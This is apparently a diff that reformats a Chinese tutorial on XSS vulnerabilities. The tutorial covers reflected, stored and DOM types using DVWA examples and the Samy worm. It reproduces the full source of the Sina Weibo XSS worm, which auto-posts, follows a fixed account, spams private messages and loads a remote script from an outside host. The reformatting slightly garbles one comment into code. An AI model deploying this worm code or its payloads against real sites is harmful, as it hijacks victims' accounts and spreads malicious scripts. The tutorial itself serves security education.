@@ -9,6 +9,7 @@
 XSS 漏洞，通常指的是网站对用户输入数据未做有效过滤，攻击者可以将恶意脚本注入网站页面中，达到执行恶意代码的目的。攻击者只需要诱使受害者打开特定的网址，就可以在受害者的浏览器中执行被注入的恶意代码，从而窃取用户身份，执行一些敏感操作，或是进行其他的危害行为。
 
 ## 危害：绝不仅仅只是弹框
+
 一些听过 XSS的同学，可能仅停留在弹框的印象里；我曾在修复此类漏洞时，只是简单地针对alert 函数做了下过滤。这都是对 XSS 攻防原理理解不够造成的误解。其实，只要你想象力够丰富，它的危害是可以造成很大的。
 
 比如 2005 年 10 月 4 日诞生的世界上第一个 XSS 蠕虫：Samy（作者的名字）。Samy 利用网络社交媒体 MySpace的XSS 漏洞传播，受害者会自动将 Samy 本人添加为关注者，并在受害者的用户页面显示一行字串“but most of all，samy is my hero”，并再次插入恶意代码，谁访问受害者的网页谁就会被感染。
@@ -23,8 +24,6 @@ Samy 蠕虫是现实世界中 XSS 攻击的经典案例，除了蠕虫攻击外�
 
 如果能充分利用好业务场景下的功能，再结合一定技术和想象力，XSS 所造成的危害绝不仅仅只是弹框。
 
-
-
 ## XSS 漏洞的分类
 
 通常 XSS 分为存储型和反射型，但还有一种比较特殊的 DOM 型 XSS，它本身属于反射型 XSS，不过介绍的时候需要单独来讲。因此，我就按 3 种类型划分：反射型、存储型、DOM 型。
@@ -36,7 +35,9 @@ Samy 蠕虫是现实世界中 XSS 攻击的经典案例，除了蠕虫攻击外�
 以 [DVWA](https://blog.csdn.net/2302_82189125/article/details/135834194) 中的反射型 XSS 题目为例，通过向 name 参数输入以下代码即可触发漏洞：
 
 ```html
-<script>alert(1)</script>
+<script>
+    alert(1)
+</script>
 ```
 
 ![](assets/QQ_1731308046836.png)
@@ -110,7 +111,7 @@ DOM 型 XSS 漏洞，它是基于文档对象模型（Document Object Model，DO
 `domxss` 函数就 2 行代码，第一行代码先通过 `document.getElementById("text").value` 获取 ID 为 `"text"`的元素内容。其实这就是输入框的内容，输入框的 ID就叫“text”。
 
 ```html
-<input id="text" name="text" type="text" value="">
+<input id="text" name="text" type="text" value="" />
 ```
 
 第二行代码是将获取的输入框内容传递给 ID 为 `"dom"` 的元素，并将其写入 `innerHTML`，也就是输出到 HTML 页面中，整个过程对用户输入数据都未做任何过滤。直接输入 `test` 看下：
@@ -120,10 +121,10 @@ DOM 型 XSS 漏洞，它是基于文档对象模型（Document Object Model，DO
 可以看到，输入框的内容输出到了 dom 元素中，作为 a 标签的链接地址。我们直接利用 JavaScript 伪协议来构造链接触发 JS 代码的执行，输入以下代码，然后点击“what do you see?”链接后即可触发漏洞：
 
 ```js
-javascript:alert(1)
+javascript: alert(1)
 ```
 
-![利用 javascript 伪协议触发漏洞](assets/2024-11-11 15.21.20.gif)
+![利用 JavaScript 伪协议触发漏洞](assets/2024-11-11 15.21.20.gif)
 
 导致 DOM 型 XSS 的相关 DOM 操作函数有很多，这里我只是举了比较常见的 `innerHTML` 属性设置导致的漏洞为例子，其他的还有像 `eval`、`document.write` 等可触发漏洞的数据输出位置。
 
@@ -165,123 +166,107 @@ Ajax 中的核心技术就是 XMLHttpRequest，它允许 JavaScript 脚本与服
 
 ```js
 // 创建 XMLHttp 对象用于收发请求
-function createXHR(){ 
-    return window.XMLHttpRequest?
-    new XMLHttpRequest():
-    new ActiveXObject("Microsoft.XMLHTTP");
+function createXHR() {
+    return window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject('Microsoft.XMLHTTP')
 }
 
-function getappkey(url){
-    xmlHttp = createXHR();
-    xmlHttp.open("GET",url,false); //获取 AppKey 不采用异步执行,等待请求返回 
-    xmlHttp.send();
-    result = xmlHttp.responseText;
-    id_arr = '';
-    // 正则匹配出 AppKey 数组,包含每个被收听用户的 uid 
-    id = result.match(/namecard=\"true\" title=\"[^\"]*/g);
-         https://beefproject.com/
-    for(i=0;i<id.length;i++){
-        sum = id[i].toString().split('"')[3];  //重新提取整理
-        id_arr += sum + '||';
-    }
-    return id_arr;
+function getappkey(url) {
+    xmlHttp = createXHR()
+    xmlHttp.open('GET', url, false) //获取 AppKey 不采用异步执行,等待请求返回
+    xmlHttp.send()
+    result = xmlHttp.responseText
+    id_arr = ''
+    // 正则匹配出 AppKey 数组,包含每个被收听用户的 uid
+    id = result.match(/namecard=\"true\" title=\"[^\"]*/g)
+    //beefproject.com/
+    https: for (i = 0; i < id.length; i++) {
+        sum = id[i].toString().split('"')[3] //重新提取整理
+        id_arr += sum + '||'
+    }
+    return id_arr
 }
 
-function random_msg(){
+function random_msg() {
     // 使用短地址服务，构造 XSS 传播连接，隐藏自己的恶意 js 脚本，
     // 这里正是 XSS 漏洞的触发位置
- //http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=upd
-    link = ' http://163.fm/PxZHoxn?id=' + new Date().getTime();;
-    // 话题列表 
-    var msgs = [
-        '郭美美事件的一些未注意到的细节：',
-        '建党大业中穿帮的地方：',
-        '让女人心动的 100 句诗歌：',
-        '3D 肉团团高清普通话版种子：',
-        '这是传说中的神仙眷侣啊：',
-        '惊爆!范冰冰艳照真流出了：',
-        '杨幂被爆多次被潜规则:',
-        '傻仔拿锤子去抢银行：',
-        '可以监听别人手机的软件：',
-        '个税起征点有望提到 4000：']; 
+    //http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=upd
+    link = ' http://163.fm/PxZHoxn?id=' + new Date().getTime()
+    // 话题列表
+    var msgs = ['郭美美事件的一些未注意到的细节：', '建党大业中穿帮的地方：', '让女人心动的 100 句诗歌：', '3D 肉团团高清普通话版种子：', '这是传说中的神仙眷侣啊：', '惊爆!范冰冰艳照真流出了：', '杨幂被爆多次被潜规则:', '傻仔拿锤子去抢银行：', '可以监听别人手机的软件：', '个税起征点有望提到 4000：']
 
-
-    //随机选取话题,加上之前的传播连接作为微博内容 
-    var msg = msgs[Math.floor(Math.random()*msgs.length)] + link;
-    msg = encodeURIComponent(msg); //对内容进行 Url 编码
-    return msg;
+    //随机选取话题,加上之前的传播连接作为微博内容
+    var msg = msgs[Math.floor(Math.random() * msgs.length)] + link
+    msg = encodeURIComponent(msg) //对内容进行 Url 编码
+    return msg
 }
 
 // 利用 Ajax 发送 POST 请求
-function post(url,data,sync){
-    xmlHttp = createXHR();
-    xmlHttp.open("POST",url,sync);
-    xmlHttp.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
-    xmlHttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
-    xmlHttp.send(data);
+function post(url, data, sync) {
+    xmlHttp = createXHR()
+    xmlHttp.open('POST', url, sync)
+    xmlHttp.setRequestHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
+    xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8')
+    xmlHttp.send(data)
 }
 
 // 发表微博，话题随机
-function publish(){
-    url = 'http://weibo.com/mblog/publish.php?rnd=' + new Date().getTime();
-    data = 'content=' + random_msg() + '&pic=&styleid=2&retcode='; //使用 random_msg 生成随机话题
-    post(url,data,true);
+function publish() {
+    url = 'http://weibo.com/mblog/publish.php?rnd=' + new Date().getTime()
+    data = 'content=' + random_msg() + '&pic=&styleid=2&retcode=' //使用 random_msg 生成随机话题
+    post(url, data, true)
 }
 
 // 自动关注用户
-function follow(){
-    url = 'http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&atnId=profile&rnd=' + new Date().getTime();
+function follow() {
+    url = 'http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&atnId=profile&rnd=' + new Date().getTime()
     // 使用当前页面存储的$CONFIG.$uid 构造自动关注数据包
-    data = 'uid=' + 2201270010 + '&fromuid=' + $CONFIG.$uid + '&refer_sort=profile&atnId=profile';
-    post(url,data,true);
+    data = 'uid=' + 2201270010 + '&fromuid=' + $CONFIG.$uid + '&refer_sort=profile&atnId=profile'
+    post(url, data, true)
 }
 
 // 发送私信
-function message(){
-    url = 'http://weibo.com/' + $CONFIG.$uid + '/follow'; //构造用户关注用户列表页 Url
-    ids = getappkey(url); //获取被关注用户的 Appkey 数组
-    id = ids.split('||'); //分割出每个被关注用户的 Appkey
-    for(i=0;i<id.length - 1 & i<5;i++){
-        //构造私信发送 Url
-        msgurl = 'http://weibo.com/message/addmsg.php?rnd=' + new Date().getTime();
-        msg = random_msg();
-        msg = encodeURIComponent(msg);
-        user = encodeURIComponent(encodeURIComponent(id[i]));
-        data = 'content=' + msg + '&name=' + user + '&retcode=';
-        post(msgurl,data,false);  //通过 XmlHttpRequest 发送请求
-    }
+function message() {
+    url = 'http://weibo.com/' + $CONFIG.$uid + '/follow' //构造用户关注用户列表页 Url
+    ids = getappkey(url) //获取被关注用户的 Appkey 数组
+    id = ids.split('||') //分割出每个被关注用户的 Appkey
+    for (i = 0; (i < id.length - 1) & (i < 5); i++) {
+        //构造私信发送 Url
+        msgurl = 'http://weibo.com/message/addmsg.php?rnd=' + new Date().getTime()
+        msg = random_msg()
+        msg = encodeURIComponent(msg)
+        user = encodeURIComponent(encodeURIComponent(id[i]))
+        data = 'content=' + msg + '&name=' + user + '&retcode='
+        post(msgurl, data, false) //通过 XmlHttpRequest 发送请求
+    }
 }
 
-function main(){
-    try{
-        publish(); //模拟发表微博
-    } catch(e){}
-    
-    try{
-        follow(); //模拟关注用户
-    }catch(e){}
+function main() {
+    try {
+        publish() //模拟发表微博
+    } catch (e) {}
 
-    try{
-        message(); //模拟发送私信
-    }catch(e){}
+    try {
+        follow() //模拟关注用户
+    } catch (e) {}
+
+    try {
+        message() //模拟发送私信
+    } catch (e) {}
 }
 
-try{
+try {
+    //在当前 body 尾部插入存放在远端的 Xss 恶意脚本
+    x = "g=document.createElement('script');g.src='http://www.2kt.cn/images/t.js';document.body.appendChild(g)"
+    window.opener.eval(x)
+} catch (e) {}
 
-    //在当前 body 尾部插入存放在远端的 Xss 恶意脚本
- x="g=document.createElement('script');g.src='http://www.2kt.cn/images/t.js';document.body.appendChild(g)";window.opener.eval(x);
-}catch(e){}
+main()
 
-main();
-
-var t=setTimeout('location="http://weibo.com/pub/topic";',5000);
+var t = setTimeout('location="http://weibo.com/pub/topic";', 5000)
 //等待 5 秒跳转到微话题页面
 ```
 
-
-
 ## 工具推荐
 
-- [BeEF](https://github.com/beefproject/beef)：https://github.com/beefproject/beef
-- [pikachu](https://github.com/zhuifengshaonianhanlu/pikachu)：https://github.com/zhuifengshaonianhanlu/pikachu
-
+- [BeEF](https://github.com/beefproject/beef)：<https://github.com/beefproject/beef>
+- [pikachu](https://github.com/zhuifengshaonianhanlu/pikachu)：<https://github.com/zhuifengshaonianhanlu/pikachu>
